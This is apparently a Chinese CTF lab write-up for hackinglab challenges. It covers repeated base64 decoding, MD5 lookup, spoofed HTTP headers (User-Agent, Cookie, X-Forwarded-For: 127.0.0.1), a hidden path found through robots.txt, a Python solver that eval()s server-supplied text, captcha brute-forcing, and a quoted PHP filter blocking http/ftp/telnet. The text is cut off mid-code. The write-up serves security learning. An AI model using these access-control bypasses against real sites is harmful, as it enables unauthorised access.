VlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0= 看得出来这是base64加密，写个脚本，不停解密直至报错。 1234567891011121314151617#!/usr/bin/env python3# -*- coding: utf-8 -*-import base64s = 'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0='count = 0s = bytes(s, encoding='UTF8')try: while True: s = base64.b64decode(s) count += 1except Exception as e: print(e)print(count)print(s) 4.据说MD5加密很安全，真的是么？ e0960851294d7b2253978ba858e24633 直接找个在线md5解密cmd5。 5.种族歧视 小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！ 跟国籍有关的只有Accept-Language,改成英文就可以: 6.HAHA浏览器 据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？ User-Agent字段代表了Request的浏览器类型，直接改成HAHA。 7.key究竟在哪里呢？ 上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？ 抓包分析，看到Response头里面有key 8.key又找不到了 小明这次可真找不到key去哪里了，你能帮他找到key吗？ 抓包发现302重定向，直接访问url。 9.冒充登陆用户 小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？ 抓包发现Response头有个Set-Cookie: Login=0 重新发送Request 修改Cookie:Login=1即可 10.比较数字大小 只要比服务器上的数字大就可以了！ 抓包分析，可以发现input设置了maxlength=3，猜测服务器估计跟1000比较，抓包直接修改RAW内容，随便填一个大数即可。 11.本地的诱惑 小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？ 添加X-Forwarded-For: 127.0.0.1 即可。 X-Forwarded-For是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。 12.就不让你访问 小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs! 试了下常见的admin，发现没有，想到了一个东西robots.txt。 robots.txt是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。注意robots.txt是用字符串比较来确定是否获取URL，所以目录末尾有与没有斜杠“/”表示的是不同的URL。robots.txt允许使用类似”Disallow: *.gif”这样的通配符。 可以看见有个Disallow: /9fb97531fe95594603aff7e794ab2f5f/,访问这个地址发现说you find me,but I am not the login page. keep search.尝试login.php.get key. 脚本关1.key又又找不到了 小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！ 抓包，发现有两条，中间那条即是key。 2.快速口算 小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？ 发现每次的题目都不一致，只能上脚本了。 123456789101112131415161718192021222324252627#!/usr/bin/env python3# -*- coding: utf-8 -*-import urllib.requestfrom bs4 import BeautifulSoupimport reimport requestssession = requests.Session()url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'# get equationresponse = session.get(url)soup = BeautifulSoup(response.content, 'lxml')pattern = re.compile(r'^[\s]*([+*/\-\d()]+)')equation = re.match(pattern, soup.form.contents[2])result = eval(equation.group(1))# post resultdata = &#123;'v': result&#125;result = session.post(url, data)print(result.content) 3.这个题目是空的 Tips:这个题目真不是随便设置的。 什么才是空的呢？ 通关地址：没有，请直接提交答案(小写即可) 直接输出即可，尝试常见认为是空的字段,最后测得null。 4.怎么就是不弹出key呢？ 提交说明：提交前14个字符即可过关 查看script，相关弹窗都返回false，直接拖到本地，删掉前面的： 123456789function alert(a)&#123; return false;&#125;document.write=function()&#123; return false;&#125;function prompt(a)&#123; return false;&#125; 剩下的运行就好了，因为要求前14个，改下输出：1alert("key is first 14 chars "+d.substring(0,14)); 5.逗比验证码第一期 逗比的验证码，有没有难道不一样吗？ 验证码使用后不过期，上BurpSuite设置payload取值attack，根据length排序，发现有一个包不一致，得到key: 6.逗比验证码第二期 验证便失效的验证码 试几次就会发现他这个失效是真失效了,发的包不用加验证码了，直接去掉vcode字段进行破解。 7.逗比的验证码第三期（SESSION） 尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？ session验证，把 cookies 的内容删掉就好。 8.微笑一下就能过关了 尼玛，碰到这样的题我能笑得出来嘛… 看源码，发现源代码是一个链接，可以看到后台源码，点击看一下： 12345678910111213141516171819202122232425262728&lt;?php header("Content-type: text/html; charset=utf-8"); if (isset($_GET['view-source'])) &#123; show_source(__FILE__); exit(); &#125; include('flag.php'); $smile = 1; if (!isset ($_GET['^_^'])) $smile = 0; if (preg_match ('/\./', $_GET['^_^'])) $smile = 0; if (preg_match ('/%/', $_GET['^_^'])) $smile = 0; if (preg_match ('/[0-9]/', $_GET['^_^'])) $smile = 0; if (preg_match ('/http/', $_GET['^_^']) ) $smile = 0; if (preg_match ('/https/', $_GET['^_^']) ) $smile = 0; if (preg_match ('/ftp/', $_GET['^_^'])) $smile = 0; if (preg_match ('/telnet/', $_GET['^_^'])) $smile = 0; if (preg_match ('/_/', $_SERVER['QUERY_STRING'])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET['^_^'])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET['^_^']); if ($smile === 